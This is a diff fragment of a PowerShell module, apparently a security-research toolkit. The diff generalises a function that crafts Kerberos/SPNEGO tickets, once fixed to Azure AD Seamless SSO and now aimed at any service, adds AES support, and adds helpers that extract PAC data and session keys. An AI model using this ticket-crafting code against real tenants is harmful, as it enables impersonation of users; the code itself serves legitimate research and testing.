+                                                                #Add-DERInteger -Data @(0x12) # AES256_CTS_HMAC_SHA1_96
+                                                                #Add-DERInteger -Data @(0x11) # AES128_CTS_HMAC_SHA1_96
                                                                 Add-DERInteger -Data @(0x17) # RC4_HMAC_NT
                                                             )
                                                         )
                                                     )
                                                 )
-                                                Add-DERTag -Tag 0x30 -Data @(
+                                                Add-DERSequence -Data @(
                                                     Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x8D))
                                                     Add-DERTag -Tag 0xA1 -Data @(
                                                         Add-DERTag -Tag 0x04 -Data @(
                                                             
-                                                            Add-DERTag -Tag 0x30 -Data @(
-                                                                Add-DERTag -Tag 0x30 -Data @(
+                                                            Add-DERSequence -Data @(
+                                                                Add-DERSequence -Data @(
                                                                     Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00)) #Restrictiontype = 0
                                                                     # Restrictions
                                                                         Add-DERTag -Tag 0xA1 -Data @(Add-DERTag -Tag 0x04 -Data @(
@@ -670,12 +749,12 @@ Function New-KerberosTicket
                                                   )
                                              )
            
-                                                Add-DERTag -Tag 0x30 -Data @(
+                                                Add-DERSequence -Data @(
                                                     # KerbLocal
                                                     Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x8E))
                                                     Add-DERTag -Tag 0xA1 -Data @(Add-DERTag -Tag 0x04 -Data $kerbLocal2)
                                                     )
-                                                Add-DERTag -Tag 0x30 -Data @(
+                                                Add-DERSequence -Data @(
                                                     Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x8F))
                                             
                                                     Add-DERTag -Tag 0xA1 -Data @(
@@ -685,12 +764,13 @@ Function New-KerberosTicket
                                                         )
                                                     )
                                                 ) 
-                                                    @(0x30, 0x81, 0x82) # Don't ask..
-                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x90))
+                                                    Add-DERSequence -Data @(
+                                                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x90))
                                             
-                                                    Add-DERTag -Tag 0xA1 -Data @(
-                                                        # KerbServiceTarget
-                                                        Add-DERUnicodeString -Text "HTTP/autologon.microsoftazuread-sso.com@$Realm"
+                                                        Add-DERTag -Tag 0xA1 -Data @(
+                                                            # KerbServiceTarget
+                                                            Add-DERUnicodeString -Text "$ServiceTarget@$Realm"
+                                                        )
                                                     )
                                            )
                                       )
@@ -700,22 +780,21 @@ Function New-KerberosTicket
                   )
              )
         )
-        $encryptedAuthenticator = Encrypt-Kerberos -Data $authenticator -Key $SessionKey
-
+        $encryptedAuthenticator = Encrypt-Kerberos -Data $authenticator -Key $SessionKey -Type Authenticator -Salt $AESSalt -Crypto $Crypto
 
         # NegTokenInit
         $kerberosTicket=Add-DERTag -Tag 0x60 -Data @(
-            Add-DERTag -Tag 0x06 -Data @(0x2b, 0x06, 0x01, 0x05, 0x05, 0x02) # OID: 1.3.6.1.5.5.2 SPNEGO
+            Add-DERObjectIdentifier -ObjectIdentifier "1.3.6.1.5.5.2" # SPNEGO
             Add-DERTag -Tag 0xA0 -Data @(
     
-                Add-DERTag -Tag 0x30 -Data @(
+                Add-DERSequence -Data @(
                     # MechTypeList
                     Add-DERTag -Tag 0xA0 -Data @( # MechTypeList
-                        Add-DERTag -Tag 0x30 -Data @(
-                            Add-DERTag -Tag 0x06 -Data @(0x2A, 0x86, 0x48, 0x82, 0xF7, 0x12, 0x01, 0x02, 0x02)        # 1.2.840.48018.1.2.2  =   Microsoft Kerberos OID
-                            Add-DERTag -Tag 0x06 -Data @(0x2A, 0x86, 0x48, 0x86, 0xF7, 0x12, 0x01, 0x02, 0x02)        # 1.2.840.113554.1.2.2 =   Kerberos V5 OID
-                            Add-DERTag -Tag 0x06 -Data @(0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x1E)  # 1.3.6.1.4.1.311.2.2.30 = Negoex
-                            Add-DERTag -Tag 0x06 -Data @(0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0A)  # 1.3.6.1.4.1.311.2.2.10 = NTLM
+                        Add-DERSequence -Data @(
+                            Add-DERObjectIdentifier -ObjectIdentifier "1.2.840.48018.1.2.2"    # Microsoft Kerberos OID
+                            Add-DERObjectIdentifier -ObjectIdentifier "1.2.840.113554.1.2.2"   # Kerberos V5 OID
+                            Add-DERObjectIdentifier -ObjectIdentifier "1.3.6.1.4.1.311.2.2.30" # Negoex
+                            Add-DERObjectIdentifier -ObjectIdentifier "1.3.6.1.4.1.311.2.2.10" # NTLM
                         )
                     )
                     Add-DERTag -Tag 0xA2 -Data @( # MechToken
@@ -724,34 +803,41 @@ Function New-KerberosTicket
                         Add-DERTag -Tag 0x04 -Data @(
                             Add-DERTag -Tag 0x60 -Data @(# Application constructed object
                         
-                                    Add-DERTag -Tag 0x06 -Data @(0x2A, 0x86, 0x48, 0x86, 0xF7, 0x12, 0x01, 0x02, 0x02) # Kerberos V5 OID
-                                    @(0x01, 0x00) #??
+                                    Add-DERObjectIdentifier -ObjectIdentifier "1.2.840.113554.1.2.2"   # Kerberos V5 OID
+                                    Add-DERBoolean -Value $False
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         Add-DERTag -Tag 0x6E -Data @(
-                            Add-DERTag -Tag 0x30 -Data @(
+                            Add-DERSequence -Data @(
                                 Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x05)) 
                                 Add-DERTag -Tag 0xA1 -Data @(Add-DERInteger -Data @(0x0e)) 
-                                Add-DERTag -Tag 0xA2 -Data @(Add-DERTag -Tag 0x03 -Data @(0x00, 0x20, 0x00, 0x00, 0x00)) # ?
+                                Add-DERTag -Tag 0xA2 -Data @(Add-DERTag -Tag 0x03 -Data @(0x00, 0x20, 0x00, 0x00, 0x00)) # KERB_VALINFO
                                 Add-DERTag -Tag 0xA3 -Data @(
                             # AUTHENTICATOR
                                     Add-DERTag -Tag 0x61 -Data @(
-                                        Add-DERTag -Tag 0x30 -Data @(
+                                        Add-DERSequence -Data @(
                                         Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x05)) # AuthenticatorVersionNumber = 5
                                         Add-DERTag -Tag 0xA1 -Data @(Add-DERUtf8String -Text $Realm)
                                         Add-DERTag -Tag 0xA2 -Data @(
-                                            Add-DERTag -Tag 0x30 -Data @(
+                                            Add-DERSequence -Data @(
                                                 Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x02))
                                                 Add-DERTag -Tag 0xA1 -Data @(
-                                                    Add-DERTag -Tag 0x30 -Data @(
-                                                        Add-DERUtf8String -Text "HTTP"
-                                                        Add-DERUtf8String -Text "autologon.microsoftazuread-sso.com"
+                                                    Add-DERSequence -Data @(
+                                                        Add-DERUtf8String -Text $ServiceTarget.Split("/")[0]
+                                                        Add-DERUtf8String -Text $ServiceTarget.Split("/")[1]
                                                     )
                                                 )
                                             )
                                         )
                                         Add-DERTag -Tag 0xA3 -Data @(
-                                            Add-DERTag -Tag 0x30 -Data @(
-                                                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x17))
-                                                Add-DERTag -Tag 0xA1 -Data @(Add-DERInteger -Data @(0x05))
+                                            Add-DERSequence -Data @(
+                                                if($Crypto -eq "RC4")
+                                                {
+                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x17)) # rc4-hmac
+                                                }
+                                                elseif($Crypto -eq "AES")
+                                                {
+                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x12)) # aes256-cts-hmac-sha1-96
+                                                }
+                                                Add-DERTag -Tag 0xA1 -Data @(Add-DERInteger -Data @(0x05)) 
                                                 Add-DERTag -Tag 0xA2 -Data @(Add-DERTag -Tag 0x04 $encryptedTicket)
                                                
                                             )
@@ -765,8 +851,15 @@ Function New-KerberosTicket
                             )
 
                             Add-DERTag -Tag 0xA4 -Data @(
-                                            Add-DERTag -Tag 0x30 -Data @(
-                                                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x17))
+                                            Add-DERSequence -Data @(
+                                                if($Crypto -eq "RC4")
+                                                {
+                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x17)) # rc4-hmac
+                                                }
+                                                elseif($Crypto -eq "AES")
+                                                {
+                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x12)) # aes256-cts-hmac-sha1-96
+                                                }
                                                 Add-DERTag -Tag 0xA2 -Data @(Add-DERTag -Tag 0x04 $encryptedAuthenticator)
 
                                                 
@@ -785,5 +878,86 @@ Function New-KerberosTicket
         # Return
         $b64Ticket=[Convert]::ToBase64String([byte[]]$kerberosTicket)
         return $b64Ticket
+    }
+}
+
+
+# Extracts PAC from the given Kerberos token
+# Mar 26th 2021
+function Get-PAC
+{
+    Param(
+        [Parameter(Mandatory=$True)]
+        [byte[]]$Token
+    )
+    Process
+    {
+        $parsedToken = Parse-Asn1 -Data $Token
+
+        return $parsedToken.Data[1].Data.Data[1].Data.Data.Data[2].Data.Data[3].Data.Data.Data[3].Data.Data[2].Data.Data
+    }
+}
+
+# Extracts Authenticator from the given Kerberos token
+# Mar 26th 2021
+function Get-Authenticator
+{
+    Param(
+        [Parameter(Mandatory=$True)]
+        [byte[]]$Token
+    )
+    Process
+    {
+        $parsedToken = Parse-Asn1 -Data $Token
+
+        return $parsedToken.Data[1].Data.Data[1].Data.Data.Data[2].Data.Data[4].Data.Data[1].Data.Data
+    }
+}
+
+# Parses PAC
+# Mar 27th 2021
+function Parse-PAC
+{
+    Param(
+        [Parameter(Mandatory=$True)]
+        [byte[]]$PAC
+    )
+    Process
+    {
+        # PAC doesn't have "root" element, so let's add one
+        $newData = Add-DERSequence -Data $PAC
+        return Parse-Asn1 -Data $newData
+    }
+}
+
+# Parses PAC
+# Mar 27th 2021
+function Parse-Authenticator
+{
+    Param(
+        [Parameter(Mandatory=$True)]
+        [byte[]]$Authenticator
+    )
+    Process
+    {
+        # Authenticator doesn't have "root" element, so let's add one
+        $newData = Add-DERSequence -Data $Authenticator
+        return Parse-Asn1 -Data $newData
+    }
+}
+
+# Gets the sessionkey from PAC
+# Mar 26th 2021
+function Get-SessionKeyFromPAC
+{
+    Param(
+        [Parameter(Mandatory=$True)]
+        [byte[]]$PAC
+    )
+    Process
+    {
+        $parsedPAC = Parse-PAC -PAC $PAC
+
+        return $parsedPAC.Data.Data.Data[1].Data.Data[1].Data.Data
     }
 }
